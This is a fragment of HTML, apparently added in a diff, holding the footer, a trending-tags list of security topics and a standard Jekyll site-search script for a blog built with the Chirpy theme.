+<div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div>
+</div></footer>
+</div>
+<div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content">
+<div id="search-hints">
+<h4 class="text-muted mb-4">Trending Tags</h4>
+<a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a>
+</div>
+<div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+</div></div>
+</div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
